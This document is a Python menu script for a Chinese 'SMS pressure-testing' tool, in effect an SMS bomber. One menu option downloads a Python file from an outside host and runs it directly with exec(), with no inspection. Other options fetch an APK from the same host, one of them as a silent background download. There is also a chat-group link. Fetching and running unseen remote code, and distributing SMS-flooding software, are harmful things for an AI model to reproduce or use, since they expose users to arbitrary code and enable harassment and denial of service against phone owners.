import subprocess
import sys
import importlib
import urllib.request
import time
import os
import webbrowser
import threading


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


def print_banner():
    print('\033[48;5;196m\033[38;5;255m╔' + '═' * 68 + '╗\033[0m')
    print('\033[48;5;226m\033[38;5;16m║' + ' ' * 18 + '短信测压工具 v9.9' + ' ' * 19 + '║\033[0m')
    print('\033[48;5;46m\033[38;5;16m╠' + '═' * 68 + '╣\033[0m')
    print('\033[48;5;32m\033[38;5;255m║' + ' ' * 5 + '▶ 1. 调用网络Python脚本' + ' ' * 26 + '║\033[0m')
    print('\033[48;5;32m\033[38;5;255m║' + ' ' * 5 + '▶ 2. 浏览器跳转下载软件' + ' ' * 26 + '║\033[0m')
    print('\033[48;5;32m\033[38;5;255m║' + ' ' * 5 + '▶ 3. 直接下载软件' + ' ' * 30 + '║\033[0m')
    print('\033[48;5;32m\033[38;5;255m║' + ' ' * 5 + '▶ 4. 后台静默下载' + ' ' * 30 + '║\033[0m')
    print('\033[48;5;32m\033[38;5;255m║' + ' ' * 5 + '▶ 5. 加入交流群' + ' ' * 34 + '║\033[0m')
    print('\033[48;5;196m\033[38;5;255m║' + ' ' * 5 + '■ 0. 退出系统' + ' ' * 37 + '║\033[0m')
    print('\033[48;5;232m\033[38;5;255m╚' + '═' * 68 + '╝\033[0m')
    print()


def print_success(text):
    print(f'\033[48;5;22m\033[38;5;255m[✓] {text}\033[0m')


def print_error(text):
    print(f'\033[48;5;124m\033[38;5;255m[✗] {text}\033[0m')


def print_info(text):
    print(f'\033[48;5;208m\033[38;5;16m[!] {text}\033[0m')


def print_loading(text):
    print(f'\033[48;5;27m\033[38;5;255m[*] {text}\033[0m')


def print_title(text):
    print(f'\033[48;5;93m\033[38;5;255m {text} \033[0m')


def print_link(text):
    print(f'\033[48;5;20m\033[38;5;255m {text} \033[0m')


def print_group(text):
    print(f'\033[48;5;90m\033[38;5;255m {text} \033[0m')


def print_dep_success(text):
    print(f'\033[48;5;22m\033[38;5;255m {text} \033[0m')


def print_dep_check(text):
    print(f'\033[48;5;18m\033[38;5;255m {text} \033[0m')


def print_script_line(text):
    print(f'\033[48;5;236m\033[38;5;255m {text} \033[0m')


def print_prompt(text):
    print(f'\033[48;5;226m\033[38;5;16m {text} \033[0m')


def print_return(text):
    print(f'\033[48;5;240m\033[38;5;255m {text} \033[0m')


def install_package(package):
    try:
        subprocess.run([sys.executable, '-m', 'pip', 'install', package, '-q'], timeout=60)
        return True
    except:
        return False


def check_and_install_deps():
    deps = ['ssl', 'socket', 'base64', 'packaging']
    all_installed = True

    print_title('依赖检查与安装')

    for dep in deps:
        try:
            importlib.import_module(dep)
            print_dep_success(f'✓ {dep} 已安装')
        except ImportError:
            print_info(f'✗ {dep} 未安装，正在安装...')
            if install_package(dep):
                print_dep_success(f'✓ {dep} 安装成功')
            else:
                print_error(f'✗ {dep} 安装失败')
                all_installed = False

    return all_installed


def download_with_retry(url, max_retries=3):
    for i in range(max_retries):
        try:
            print_info(f'第 {i + 1} 次尝试连接')
            req = urllib.request.urlopen(url, timeout=30)
            data = req.read()
            print_success(f'成功获取数据，大小: {len(data)} 字节')
            return data
        except Exception as e:
            print_error(f'连接失败: {str(e)[:40]}')
            if i < max_retries - 1:
                print_info(f'等待 {i + 1} 秒后重试')
                time.sleep(i + 1)
    return None


def download_with_progress(url, filename):
    try:
        req = urllib.request.urlopen(url, timeout=30)
        total_size = int(req.headers.get('Content-Length', 0))
        downloaded = 0
        chunk_size = 8192
        start_time = time.time()

        print_loading('开始下载文件')

        with open(filename, 'wb') as f:
            while True:
                chunk = req.read(chunk_size)
                if not chunk:
                    break
                f.write(chunk)
                downloaded += len(chunk)

                if total_size > 0:
                    percent = (downloaded / total_size) * 100
                    bar_len = 40
                    filled = int(bar_len * downloaded // total_size)
                    bar = '\033[48;5;22m \033[0m' * filled + '\033[48;5;240m \033[0m' * (bar_len - filled)

                    elapsed = time.time() - start_time
                    speed = downloaded / elapsed / 1024 if elapsed > 0 else 0
                    remaining = (total_size - downloaded) / (speed * 1024) if speed > 0 else 0

                    sys.stdout.write(
                        f'\r\033[48;5;22m\033[38;5;255m[{bar}] {percent:.1f}% │ {speed:.1f} KB/s │ 剩余: {remaining:.1f}s\033[0m')
                    sys.stdout.flush()

        print(f'\n')
        print_success(f'下载完成: {filename} ({downloaded / 1024 / 1024:.2f} MB)')
        return True
    except Exception as e:
        print(f'\n')
        print_error(f'下载失败: {str(e)[:50]}')
        return False


def browser_download():
    url = 'http://www.b.5yu.org/%E7%AE%80.Apk'
    print_title('浏览器跳转下载')
    print_link(f'下载链接: {url}')
    print_loading('正在打开浏览器')
    time.sleep(1)
    webbrowser.open(url)
    print_success('浏览器已打开，请手动下载')


def direct_download():
    url = 'http://www.b.5yu.org/%E7%AE%80.Apk'
    filename = '清墨云短信测压.Apk'
    print_title('直接下载')

    if download_with_progress(url, filename):
        print_success('文件保存成功')
    else:
        print_error('下载失败，请检查网络')


def silent_download():
    url = 'http://www.b.5yu.org/%E7%AE%80.Apk'
    filename = '清墨云短信测压.Apk'
    print_title('后台静默下载')
    print_info('正在后台下载，请稍候...')

    def background_download():
        try:
            req = urllib.request.urlopen(url, timeout=30)
            data = req.read()
            with open(filename, 'wb') as f:
                f.write(data)
            print_success(f'静默下载完成: {filename}')
        except Exception as e:
            print_error(f'静默下载失败: {str(e)[:40]}')

    thread = threading.Thread(target=background_download)
    thread.start()
    print_info('下载任务已启动')


def join_group():
    group_url = 'https://qm.qq.com/q/nM29P1EZR8'
    print_title('加入交流群')
    print_group('QQ群: 学习与交流 👉/php/html/python/iapp/👈')
    print_link(f'群链接: {group_url}')
    print_loading('正在打开QQ加群链接')
    time.sleep(1)
    webbrowser.open(group_url)
    print_success('浏览器已打开，请扫码或点击加群')


def run_remote_script():
    print_title('远程脚本调用')
    url = 'http://www.b.5yu.org/python.py'

    data = download_with_retry(url)
    if data:
        code = data.decode('utf-8')
        print_success('源码获取成功，开始执行')
        print_script_line('─' * 70)
        try:
            exec(code)
        except Exception as e:
            print_error(f'脚本执行出错: {str(e)[:50]}')
        print_script_line('─' * 70)
        print_success('脚本执行完成')
    else:
        print_error('获取脚本失败，请检查网络')


def main():
    while True:
        clear_screen()
        print_banner()

        print_prompt('请输入选项')
        choice = input(f'\033[48;5;51m\033[38;5;16m┌─[root@hacker]─[~]\n└──╼ $\033[0m ')

        if choice == '1':
            if check_and_install_deps():
                run_remote_script()
            else:
                print_error('依赖安装失败，请检查网络后重试')
            print_return('按回车键继续')
            input()
        elif choice == '2':
            check_and_install_deps()
            browser_download()
            print_return('按回车键继续')
            input()
        elif choice == '3':
            check_and_install_deps()
            direct_download()
            print_return('按回车键继续')
            input()
        elif choice == '4':
            check_and_install_deps()
            silent_download()
            print_return('按回车键继续')
            input()
        elif choice == '5':
            join_group()
            print_return('按回车键继续')
            input()
        elif choice == '0':
            print_title('感谢使用，再见')
            time.sleep(1)
            clear_screen()
            break
        else:
            print_error(f'无效选项: {choice}')
            print_info('请重新选择')
            time.sleep(1)


if __name__ == '__main__':
    main()
